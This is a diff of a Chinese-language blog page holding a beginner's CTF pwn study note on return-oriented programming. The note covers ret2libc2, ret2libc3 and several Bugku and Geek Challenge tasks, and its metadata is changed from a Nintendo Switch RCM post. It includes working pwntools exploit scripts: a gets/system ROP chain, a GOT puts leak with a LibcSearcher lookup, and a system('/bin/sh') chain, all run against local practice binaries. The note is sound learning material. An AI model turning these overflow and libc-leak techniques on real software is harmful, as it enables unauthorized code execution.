+<p> <a href="https://www.cnblogs.com/pwn2web/p/10349971.html" target="_blank" rel="noopener">https://www.cnblogs.com/pwn2web/p/10349971.html</a> </p>
+<h3 id="5-ret2libc2"><a href="#5-ret2libc2" class="headerlink" title="5.ret2libc2"></a>5.ret2libc2</h3><p>有system函数</p>
+<p>但是没有/bin/sh去执行shell</p>
+<p>构造/bin/sh，</p>
+<ul>
+<li><p>总的思路</p>
+<p>1、用gets的地址覆盖函数返回地址</p>
+<p>2、构造gets的返回地址，（因为gets输入shellcode后，我们就要调用system函数来getshell，所以gets的返回地址是system函数的调用地址，即system_plt）</p>
+<p>3、构造gets需要的参数(就是存放输入字符串的地址，bss段0x804A080)</p>
+<p>4、构造system的参数(就是存放输入字符串的地址，bss段0x804A080)!<img src="http://image.skywang.fun//picGO/20200330150523.png" alt></p>
+</li>
+</ul>
+<p>这种从第一个函数跳到第二函数，跳来跳去的方式就是rop，串起来的方式就是rop链</p>
+<p>由于系统调用原因，调用的时候：1.先是函数地址，2。函数的返回地址，3.函数的传入参数</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">sys_plt  = <span class="number">0x08048490</span> </span><br><span class="line">io=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'What do you think ?'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="6-ret2libc3"><a href="#6-ret2libc3" class="headerlink" title="6.ret2libc3"></a>6.ret2libc3</h3><h5 id="0x01-这里就需要了解一下libc的作用"><a href="#0x01-这里就需要了解一下libc的作用" class="headerlink" title="0x01.这里就需要了解一下libc的作用"></a>0x01.这里就需要了解一下libc的作用</h5><ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本</li>
+<li>泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。</li>
+</ul>
+<h5 id="0x02-获取一下libc的版本"><a href="#0x02-获取一下libc的版本" class="headerlink" title="0x02.获取一下libc的版本"></a>0x02.获取一下libc的版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">        gdb.attach(p) #运行的时候加上G，进入gdb调试</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + &apos;aaaa&apos; + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line">print &apos;puts_addr =:&apos; +hex(u32(p.recv(4)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="http://image.skywang.fun//picGO/20200330150502.png" alt></p>
+<p>通过puts函数打印一下puts函数在got表中的位置，这个位置也就是puts函数的地址。然后通过泄露的puts函数的地址的后三位(0xf7d9aca0)ca0来确定libc的版本。确定方法有很多可以用libcdatabase去查，或者是一个python的插件LibcSearcher去查询。</p>
+<p>然后通过puts的地址减去泄露的libc中的puts函数的偏移，去获得libc_base基地址。通过libc_base+libc中需要用到的函数或者字符串的偏移去算得个函数的具体地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">#用的python插件或者libc中的偏移，github自行下载</span><br></pre></td></tr></table></figure>
+<p>然后就可以通过调用获得shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">main_addr = 0x8048618</span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">#libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + p32(main_addr) + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">#libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">#system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">#binsh_addr = libc_base + 0x15ba0b</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos; * 104 + p32(system_addr) + p32(main_addr) + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>后来为啥从112的偏移变成了104的话，我还不太会，gdb不咋会用有点尴尬</p>
+<h3 id="2-hello"><a href="#2-hello" class="headerlink" title="2.hello"></a>2.hello</h3><p>大概就是占满内存，然后就阻塞了，跳转到指定的函数地址。</p>
+<p>text一般是有权限的。</p>
+<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><h3 id="2-pwn2"><a href="#2-pwn2" class="headerlink" title="2.pwn2"></a>2.pwn2</h3><p>先覆盖，再执行</p>
+<h3 id="3-pwn4"><a href="#3-pwn4" class="headerlink" title="3.pwn4"></a>3.pwn4</h3><p>常见的除了‘/bin/sh’还有’$0’也可以是shell的地址</p>
+<h2 id="极客大挑战2019"><a href="#极客大挑战2019" class="headerlink" title="极客大挑战2019"></a>极客大挑战2019</h2><h3 id="1-pwn2"><a href="#1-pwn2" class="headerlink" title="1.pwn2"></a>1.pwn2</h3><p>直接正常操作</p>
+<p>覆盖地址，然后跳转到get shell函数</p>
+<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><h3 id="1-static-x86"><a href="#1-static-x86" class="headerlink" title="1.static x86"></a>1.static x86</h3><p>ELF 64学习</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用原理</span><br></pre></td></tr></table></figure>
+<p>由于没有开NX，所以比较好被利用，有read函数，而且read函数的空间够大</p>
+<p>alsr开启的话，可以通过read，读到read段</p>
+<p>动态链接会有plt表，会有函数地址</p>
+<p>用cyclic 去填充，看到eip地址</p>
+<p>cyclic -l去算eip的返回地址</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://skywanggg.github.io">devil0x</a>
-            <p>原文链接：<a href="https://skywanggg.github.io/2020/03/30/Nintendo Switch RCM漏洞分析/">https://skywanggg.github.io/2020/03/30/Nintendo Switch RCM漏洞分析/</a>
-            <p>发表日期：<a href="https://skywanggg.github.io/2020/03/30/Nintendo Switch RCM漏洞分析/">March 30th 2020, 4:42:16 pm</a>
-            <p>更新日期：<a href="https://skywanggg.github.io/2020/03/30/Nintendo Switch RCM漏洞分析/">March 30th 2020, 5:28:38 pm</a>
+            <p>原文链接：<a href="https://skywanggg.github.io/2019/10/14/pwn入门学习(2)基本的ROP/">https://skywanggg.github.io/2019/10/14/pwn入门学习(2)基本的ROP/</a>
+            <p>发表日期：<a href="https://skywanggg.github.io/2019/10/14/pwn入门学习(2)基本的ROP/">October 14th 2019, 3:25:41 am</a>
+            <p>更新日期：<a href="https://skywanggg.github.io/2019/10/14/pwn入门学习(2)基本的ROP/">March 30th 2020, 3:05:34 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -526,12 +526,17 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/17/ubertooth环境搭建手册/" title= "搭建ubertooth环境">
+                    <div class="nextTitle">搭建ubertooth环境</div>
+                </a>
+            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/03/30/pwn入门学习(3)jarvisoj_pwn题/" title= "pwn入门学习(3)jarvisoj_pwn题">
-                    <div class="prevTitle">pwn入门学习(3)jarvisoj_pwn题</div>
+                <a href= "/2019/10/12/逆向学习/" title= "逆向学习">
+                    <div class="prevTitle">逆向学习</div>
                 </a>
             
         </li>
@@ -650,7 +655,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-总览"><span class="toc-number">1.</span> <span class="toc-text">1.总览</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-BPMP"><span class="toc-number">2.</span> <span class="toc-text">2.BPMP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-RCM漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 RCM漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-RCM简介"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 RCM简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-USB简介"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 USB简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-端点"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 端点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-控制传输"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 控制传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-批量传输"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 批量传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-标准USB请求"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 标准USB请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-RCM使用的USB端点"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 RCM使用的USB端点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-BootRom处理RCM数据"><span class="toc-number">3.</span> <span class="toc-text">3 BootRom处理RCM数据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-RCM数据"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 RCM数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-RCM消息结构"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 RCM消息结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-整体流程"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 整体流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-SRAM内存布局结构"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 SRAM内存布局结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-接收RCM消息"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 接收RCM消息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-BootRom处理批量传输流程"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 BootRom处理批量传输流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-BootRom处理控制传输流程"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 BootRom处理控制传输流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-漏洞"><span class="toc-number">3.8.</span> <span class="toc-text">3.8 漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-利用漏洞执行非法用户代码流程"><span class="toc-number">4.</span> <span class="toc-text">4. 利用漏洞执行非法用户代码流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Switch如何进入RCM模式"><span class="toc-number">5.</span> <span class="toc-text">5. Switch如何进入RCM模式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-总结"><span class="toc-number">6.</span> <span class="toc-text">6.总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本-ROP"><span class="toc-number">1.</span> <span class="toc-text">基本 ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-checksec看到的那些参数含义"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">0x01.checksec看到的那些参数含义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-指针的含义"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">0x02.指针的含义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Wiki"><span class="toc-number">1.1.</span> <span class="toc-text">CTF-Wiki</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ret2text"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.ret2text</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ret2shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">2.ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ret2syscall-int-0x80-系统调用"><span class="toc-number">1.2.1.</span> <span class="toc-text">3.ret2syscall(int 0x80 系统调用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ret2libc1"><span class="toc-number">1.2.2.</span> <span class="toc-text">4.ret2libc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-ret2libc2"><span class="toc-number">1.2.3.</span> <span class="toc-text">5.ret2libc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-ret2libc3"><span class="toc-number">1.2.4.</span> <span class="toc-text">6.ret2libc3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-这里就需要了解一下libc的作用"><span class="toc-number">1.2.4.0.1.</span> <span class="toc-text">0x01.这里就需要了解一下libc的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-获取一下libc的版本"><span class="toc-number">1.2.4.0.2.</span> <span class="toc-text">0x02.获取一下libc的版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-hello"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.hello</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bugku"><span class="toc-number">1.3.</span> <span class="toc-text">Bugku</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-pwn2"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-pwn4"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.pwn4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#极客大挑战2019"><span class="toc-number">1.4.</span> <span class="toc-text">极客大挑战2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-pwn2"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.pwn2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test"><span class="toc-number">1.5.</span> <span class="toc-text">Test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-static-x86"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.static x86</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
